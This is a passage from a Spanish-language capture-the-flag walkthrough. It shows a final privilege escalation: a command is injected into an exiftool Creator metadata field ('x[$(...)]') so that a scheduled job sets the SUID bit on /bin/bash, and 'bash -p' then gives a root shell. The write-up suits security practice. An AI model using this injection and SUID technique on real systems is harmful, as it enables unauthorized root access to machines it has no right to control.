Revisamos los permisos de la **Bash**:
```bash
juanita@emerreuvedoble:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```

Le indicamos a **exiftool** que el campo **"Creator"** del archivo creado, tendrá como valor la ejecución de nuestro script, ubicado en otro directorio. Utilizamos la sintaxis de **perl** para usar una expresión dinámica `x[$(comando)]` que ejecute lo que indiquemos.
```bash
juanita@emerreuvedoble:/tmp$ touch berserk; exiftool -Creator='x[$(/home/juanita/bashSUID.sh)]' berserk
    1 image files updated
```

Esperamos el minuto y observamos los permisos de la **Bash**:
```bash
juanita@emerreuvedoble:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```
Ahora sí funcionó.

Ya solamente ejecutamos la **Bash** con privilegios y seremos **Root**:
```bash
juanita@emerreuvedoble:/$ bash -p
bash-5.2# whoami
root
```

Leamos la última flag:
```bash
bash-5.2# cat /root/root.txt
...
```
Y con esto, terminamos la máquina.
